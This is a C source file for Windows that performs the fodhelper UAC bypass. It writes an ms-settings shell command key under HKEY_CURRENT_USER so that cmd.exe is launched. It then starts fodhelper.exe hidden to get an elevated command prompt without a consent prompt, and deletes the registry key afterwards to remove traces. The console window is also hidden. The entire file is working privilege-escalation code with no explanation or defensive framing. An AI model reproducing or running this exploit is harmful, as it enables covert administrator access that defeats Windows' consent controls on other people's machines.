#include <Windows.h>
#include <shellapi.h>
#include <stdio.h>

#define APP_PATH L"C:\\Windows\\System32\\cmd.exe"				// Use two backslashes instead of one.
#define NIL NULL

#define SHOW SW_HIDE

#pragma warning(disable : 4996)

int executeAsSystem32();

BOOL initializeRegistry();
BOOL uninitializeRegistry();



void main() {
	HWND WINDOW_HANDLE = GetConsoleWindow();
	ShowWindow(WINDOW_HANDLE, SW_MINIMIZE && SW_HIDE);

	int RESULT = executeAsSystem32();

	exit(0);

}

int executeAsSystem32() {

	if (!initializeRegistry()) {
		return 1;
	}

	HKEY _HKEY;
	LPCWSTR subKeyPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
	LONG RESULT = RegOpenKeyEx(
		HKEY_CURRENT_USER,
		subKeyPath,
		0,
		KEY_ALL_ACCESS,
		&_HKEY
	);
	if (RESULT != ERROR_SUCCESS) {
		RegCloseKey(_HKEY);
		return 2;
	}

	RESULT = RegSetValueEx(
		_HKEY,
		NIL,
		0,
		REG_SZ,
		(BYTE*)APP_PATH,
		(wcslen(APP_PATH) + 1) * sizeof(wchar_t)
	);
	if (RESULT != ERROR_SUCCESS) {
		RegCloseKey(_HKEY);
		return 3;
	}

	SHELLEXECUTEINFO SHEXECINFO = { 0 };
	SHEXECINFO.cbSize = sizeof(SHELLEXECUTEINFO);
	SHEXECINFO.fMask = SEE_MASK_NOCLOSEPROCESS;
	SHEXECINFO.hwnd = NIL;
	SHEXECINFO.lpVerb = NIL;
	SHEXECINFO.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
	SHEXECINFO.lpParameters = NIL;
	SHEXECINFO.lpDirectory = NIL;
	SHEXECINFO.nShow = SW_HIDE;

	if (ShellExecuteEx(&SHEXECINFO)) {
		if (SHEXECINFO.hProcess != NIL) {
			WaitForSingleObject(SHEXECINFO.hProcess, INFINITE);
			CloseHandle(SHEXECINFO.hProcess);
		}
	}
	RegCloseKey(_HKEY);

	if (!uninitializeRegistry()) {
		return 4;
	}

	return 0;
}


BOOL initializeRegistry() {
	HKEY _HKEY;
	LPCWSTR subKeyPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
	LONG RESULT = RegCreateKeyEx(
		HKEY_CURRENT_USER,
		subKeyPath,
		0,
		NIL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NIL,
		&_HKEY,
		NIL
	);
	if (RESULT != ERROR_SUCCESS) {
		RegCloseKey(_HKEY);
		return FALSE;
	}

	const BYTE dlexValData[] = { 0x00 };
	RESULT = RegSetValueEx(
		_HKEY,
		L"DelegateExecute",
		0,
		REG_SZ,
		dlexValData,
		sizeof(dlexValData)
	);
	if (RESULT != ERROR_SUCCESS) {
		RegCloseKey(_HKEY);
		return FALSE;
	}

	RegCloseKey(_HKEY);
	return TRUE;
}

BOOL uninitializeRegistry() {
	LPCWSTR subKeyPath = L"Software\\Classes\\ms-settings";
	LONG RESULT = RegDeleteTreeW(
		HKEY_CURRENT_USER,
		subKeyPath
	);

	if (RESULT != ERROR_SUCCESS) {
		return FALSE;
	}

	return TRUE;
}